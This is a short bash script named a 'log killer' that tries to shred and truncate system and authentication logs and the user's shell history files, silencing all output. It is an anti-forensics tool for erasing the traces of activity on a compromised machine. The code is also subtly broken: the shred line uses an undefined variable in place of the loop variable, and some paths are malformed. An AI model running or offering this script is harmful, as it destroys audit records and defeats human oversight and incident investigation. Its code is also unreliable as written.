#!/bin/bash

main () {
    # The main function which runs the entire script

    # Calling the declare_variables function.
    declare_variables

    # Calling the start_log_killer function.
    start_log_killer

}

declare_variables() {
    # A function which declares variables

    list_of_log_files=( "/var/log/messages" "/var/log/auth.log" "/var/log/kern.log" "/var/log/cron.log" "/var/log/maillog" "/var/log/boot.log" "/var/log/mysqld.log" "/var/log/secure" "/var/log/utmp" "/var/log/wtmp " "/var/log/yum.log" "/var/log/system.log" "/var/log/DiagnosticMessages" "~/.zsh_history" "~/.bash_history")

}

start_log_killer() {

    # Iterating over each log file in the list of log files
    for file in ${list_of_log_files[@]}; do

        # Checking if file is exists
        if [ -f "$file" ];then

            # Shredding the file
            shred -vfzu $log && :> $log

        fi

    done &>/dev/null

}

# Calling the main function.
main